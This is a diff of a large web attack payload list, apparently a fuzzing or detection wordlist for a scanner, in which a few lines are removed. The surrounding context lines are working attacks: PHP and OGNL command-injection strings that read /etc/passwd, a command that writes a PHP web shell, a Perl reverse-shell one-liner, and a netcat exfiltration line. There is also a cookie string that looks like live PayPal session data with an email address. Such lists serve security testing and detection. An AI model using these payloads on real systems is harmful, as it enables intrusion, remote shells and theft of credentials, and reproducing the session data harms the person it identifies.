@@ -283,7 +283,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <?php system("cat /etc/passwd");?>
 <?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
 <?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
-<?php system("echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");?>
 <?php system("sleep 10");?>
 <?php system("sleep 5");?>
 <?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
@@ -335,10 +334,8 @@ cgi-bin/csguestbook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/cslivesupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/csnewspro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/gbook/gbook.cgi?_mailto=check;id
-cgi-bin/handler/netsonar;cat	/etc/passwd|?data=download
 cgi-bin/handler/netsonar;cat    /etc/passwd|?data=download
 cgi-bin/weblogin.cgi?username=admin';cat /etc/passwd
-cn|nc	3
 config/diff.php?file=;id&new=1&old=2
 cookie_check=yes; lang=en_us%3bus; tsrce=settingsnodeweb; ts=vr%3de012017a1640a101aa0c24dafffd19fe%26vrexpyrs%3d1627438410%26vtexpyrs%3d1532769433%26vt%3de01201911640a101aa0c24dafffd19fd; x-pp-s=eyj0ijoimtuzmjc2nzy2ndq5myisim0ioiiwin0; nsid=s%3ay8glvpmkfkxj_mr2hof2tvmhueguxf1n.8s5le6ieok4gevlg59wyswy8xxzcycxwk7nwtun3utq; akdc=ccg11-origin-www-1.paypal.com; akavpau_ppsd=1532768264~id=928bd1c25ce0be991ae8f454b7c7fc8c; xppcts=f34bc8847fea2560; login_email=pete.johnson%40shaw.ca; ui_experience=home%3d2%26login_type%3demail_password; fn_dt=344a91a6fb904898a12a18a9a268cfcf; id_token=idtoken3a976f8244b84dfe948aa108edef4953; khcl0euy7aksmgfvhl7j5e7hptk=wguwe1-mrq4xoiqepo9cyaieqt2dgexq3mfzofvq-6br53skk66ufddoukdh35iuwjwxzeo33lpstkal; hac80bwxscjqz7km6voxulob534=4sixhbrkowaac6vovotkkvgd937rbje-l3g1b6zvfps0xsennvljdymdx1nsoq5e2nyynxwatknrkuhqavt9bxsdyfug8akgxrurrxw9rptrnzoll5b_2qkvbd_i6gqiwkilz0; x-pp-ads=atoboc1cw36jqolibn15jwf.2uvpho4; navcmd=_restriction-details; x-pp-p=px45apy-swrncghzjjzv6vdwdmordffif07-wchblleotuwiplwkbamfdwd6x.zga3das4imy-eotdphtc2fkw2bqb3ctl1n4ydwv9rwbkxioejsfkupxlmxgnvny5jbgnn3zevmr8nar969rtxhuyf9nbe7fgwihrnox0yz.dxxf6qux8ggvnh12nnyk.8alk2owfx3y8jdst8wtag9mtqy7zrzzsl-xtzabaarsuufulswdjuixpcs-o1ki484; segm=kpdr9wad9vnd2klo5j9sdt3jd9dr8ddbshd72ddrt8zqpln941oplfgh9isom0wdwngll83ghjir932dfkd8fcou; cwrclyrk4locv1fydgbaxinl6ig=off2i1vuw2k_ftkk5if_rl61amxxjgyp4ekn16v1tfjk5_e01fzhgus6h0ojnguomuyi3rynk5yykbm7unnli5mpha21vzgenb_ggqybqdblrw9uygrhmcywqe4gcve2afr0ebpddcyvwwp2hpf8f0pwpkqsyzc7c22bzsigaoblsn3lysnbaezbawkwhn1vwb3d_91yehpdnf-rgh6df3reyxfzssntwo5kugue7knpamyqil_ngqoj0la
 cschatrbox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
@@ -356,13 +353,11 @@ declare @q nvarchar (200) select @q = 0x770061006900740066006f007200200064006500
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
 declare @s varchar(200) select @s = 0x77616974666f722064656c61792027303a303a31302700 exec(@s)
 devmode.action?debug=command&expression=(%23_memberaccess[%22allowstaticmethodaccess%22]%3dtrue%2c%23foo%3dnew%20java.lang.boolean(%22false%22)%20%2c%23context[%22xwork.methodaccessor.denymethodexecution%22]%3d%23foo%2c@org.apache.commons.io.ioutils@tostring(@java.lang.runtime@getruntime().exec(%27cat%20/etc/passwd%27).getinputstream()))
-di|id	10
 easymsgb.pl?print=|id|
 echo "<?php system($_get['cmd']); ?>" > cmd.php
 echo "<?php system('dir $_get['dir']'); ?>" > dir.php
 echo "use socket;$i="192.168.16.151";$p=443;socket(s,pf_inet,sock_stream,getprotobyname("tcp"));if(connect(s,sockaddr_in($p,inet_aton($i)))){open(stdin,">&s");open(stdout,">&s");open(stderr,">&s");exec("/bin/sh -i");};" > rev.pl
 echo /etc/passwd  | nc host port
-exec('echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
 exec('ls')
 exec('pwd')
 exec('pwd');
@@ -386,7 +381,6 @@ iphone 5.0 (firefox/12.0 ; u; id-en) webkit/553.0 presto/1.9.95 sistem build/frf
 iphone 5.0 (firefox/12.0 ; u; id-en) webkit/553.0 presto/1.9.95 untrusted/1.0
 iphone/5.0 (iphone; iphone/13.0; u; id) presto/2.8.199 version/11.10 untrusted/1.0
 iuagfjblisjbfl8iweirhndjsbliusbgo;idsfjnbijsdbfuydsbfjhsdvfkuyewbfhjdsvylidsvbjhvdskuhfv
-i|id	33
 juc(linux;u;android2.2.1;zh_cn;ideos;240*320;)ucweb7.8.0.95/139/355
 kaukauna catholic school system (kcss)
 kernel.exec("ls -al /")
@@ -1852,7 +1846,6 @@ nokiax3-02.5/5.0 (07.32) profile/midp-2.1 configuration/cldc-1.1 ucweb/2.0 (java
 nokiax3-02/5.0 (05.60) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 (java; u; id; nokiax3-02) applewebkit/530.13 (khtml, like gecko) ucbrowser/8.6.0.199/84/352/ucweb mobile untrusted/1.0
 nokiax3-02/5.0 (05.60) profile/midp-2.1 configuration/cldc-1.1 ucweb/2.0 (java; u; midp-2.0; id; nokiax3-02) u2/1.0.0 ucbrowser/9.5.0.449 u2/1.0.0 mobile
 nokiax3-02/5.0 (05.60) profile/midp-2.1 configuration/cldc-1.1 ucweb/2.0 (java; u; midp-2.0; id; nokiax3-02) u2/1.0.0 ucbrowser/9.5.0.449 u2/1.0.0 mobile untrusted/1.0
-n|nc	33
 onebrowser/3.5/mozilla/5.0 (linux; u; android 2.3.5; id-id; cross a5 build/mocordroid2.3.5) applewebkit/533.1 (khtml, like gecko) version/4.0 mobile safari/533.1
 onebrowser/4.0.2/mozilla/5.0 (linux; u; android 4.0.4; id-id; lenovo s560 build/imm76d) applewebkit/534.30 (khtml, like gecko) version/4.0 mobile safari/534.30
 opeara/9.80 (android; opera mini/7.6.40476/75.35; u; id) presto/2.12.423 version/12.16
@@ -3640,7 +3633,6 @@ system('curl https://crowdshield.com/.testing/rce_vuln.txt')
 system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
 system('curl https://sn1persecurity.com/.testing/rce_vuln.txt');
 system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
-system('echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
 system('ls')
 system('pwd')
 system('pwd');
